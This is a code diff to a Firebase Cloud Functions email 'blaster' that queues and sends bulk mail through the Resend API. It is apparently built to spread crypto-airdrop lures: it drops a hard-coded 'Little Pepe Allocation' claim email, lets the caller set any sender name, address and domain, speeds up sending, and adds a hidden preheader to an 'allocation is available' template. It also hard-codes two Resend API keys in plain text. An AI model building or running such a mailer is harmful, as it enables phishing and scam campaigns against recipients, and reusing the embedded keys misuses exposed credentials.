@@ -3,15 +3,32 @@ const { onSchedule } = require('firebase-functions/v2/scheduler')
 const { Resend } = require('resend')
 const admin = require('firebase-admin')
 
+const DOMAIN_CONFIG = {
+  'maulfaq.online': {
+    apiKey: 're_ECbt48yn_HvogtYFGCbgWcu4n8yN3RvMg',
+  },
+
+  'eventfarm.ng': {
+    apiKey: 're_UuafV5Ku_4BzrNWvoPBkzusBtsJrkU7Hj',
+  },
+}
+
 admin.initializeApp()
 
 const db = admin.firestore()
 
-const resend = new Resend('re_UuafV5Ku_4BzrNWvoPBkzusBtsJrkU7Hj') //eventfarm.ng
+/**
+ * =========================
+ * GENERATE CAMPAIGN ID
+ * =========================
+ */
+function generateCampaignId(domain) {
+  return `cmp_${domain}_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`
+}
 
 exports.sendBlaster = onCall(async (request) => {
   try {
-    let { emails, subject, html } = request.data
+    let { emails, subject, html, fromName, fromEmail, domain } = request.data
 
     if (typeof emails === 'string') {
       emails = emails.split(',')
@@ -26,62 +43,90 @@ exports.sendBlaster = onCall(async (request) => {
 
       batch.set(ref, {
         email,
+
         subject,
-        html: buildAirdropClaimHTML(),
+        html,
+        campaignId: generateCampaignId(domain),
+
+        fromName,
+        fromEmail,
+        domain,
+
         status: 'pending',
+
         createdAt: admin.firestore.FieldValue.serverTimestamp(),
       })
     })
 
     await batch.commit()
 
-    console.log('QUEUE WRITTEN:', emails.length)
+    console.log(`Queued ${emails.length} emails`)
 
-    return { success: true, queued: emails.length }
+    return {
+      success: true,
+      queued: emails.length,
+    }
   } catch (err) {
-    console.error('QUEUE ERROR:', err)
-    throw new HttpsError('internal', err.message) // FIXED: was functions.https.HttpsError
+    console.error(err)
+
+    throw new HttpsError('internal', err.message)
   }
 })
 
 exports.emailWorker = onSchedule('every 1 minutes', async () => {
-  const snapshot = await db
-    .collection('emailQueue')
-    .where('status', '==', 'pending')
-    .limit(5) // Reduced from 10 to be safer
-    .get()
+  const snapshot = await db.collection('emailQueue').where('status', '==', 'pending').limit(5).get()
 
-  if (snapshot.empty) return
+  if (snapshot.empty) {
+    console.log('No pending emails')
+    return
+  }
 
   for (const doc of snapshot.docs) {
     const data = doc.data()
 
     try {
+      const config = DOMAIN_CONFIG[data.domain]
+
+      if (!config) {
+        throw new Error(`No API key configured for ${data.domain}`)
+      }
+
+      const resend = new Resend(config.apiKey)
+
       await resend.emails.send({
-        from: 'Little Pepe <team@eventfarm.ng>', // CHANGE THIS
+        from: `${data.fromName} <${data.fromEmail}>`,
         to: data.email,
-        subject: data.subject || `Your Little Pepe Allocation is Ready`,
+        subject: data.subject,
         html: data.html,
-        text: buildAirdropClaimText(),
+
         headers: {
-          'List-Unsubscribe': `<https://eventfarm.ng/unsubscribe?email=${encodeURIComponent(data.email)}>`,
+          'List-Unsubscribe': `<https://${data.domain}/unsubscribe?email=${encodeURIComponent(
+            data.email,
+          )}>`,
+
           'List-Unsubscribe-Post': 'List-Unsubscribe=One-Click',
+
           Precedence: 'bulk',
         },
       })
 
       await doc.ref.update({
         status: 'sent',
+
         sentAt: admin.firestore.FieldValue.serverTimestamp(),
       })
+
+      console.log(`Sent to ${data.email}`)
     } catch (err) {
+      console.error(err)
+
       await doc.ref.update({
         status: 'failed',
         error: err.message,
       })
     }
 
-    await new Promise((r) => setTimeout(r, 5000)) // Increased delay
+    await new Promise((r) => setTimeout(r, 1000))
   }
 })
 
@@ -93,7 +138,7 @@ function buildAirdropClaimHTML() {
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Centric Rise Update</title>
+<title>Your allocation is available</title>
 <style>
   body {
     margin: 0;
@@ -111,7 +156,13 @@ function buildAirdropClaimHTML() {
     overflow: hidden;
     border: 1px solid #e5e7eb;
   }
-
+  .preheader{
+display:none;
+max-height:0;
+overflow:hidden;
+opacity:0;
+mso-hide:all;
+}
   .header {
     background: #61bafc;
     text-align: center;
@@ -162,6 +213,9 @@ function buildAirdropClaimHTML() {
     text-decoration: none;
   }
 </style>
+</head>
+<body>
+
 
 <div class="container">
 
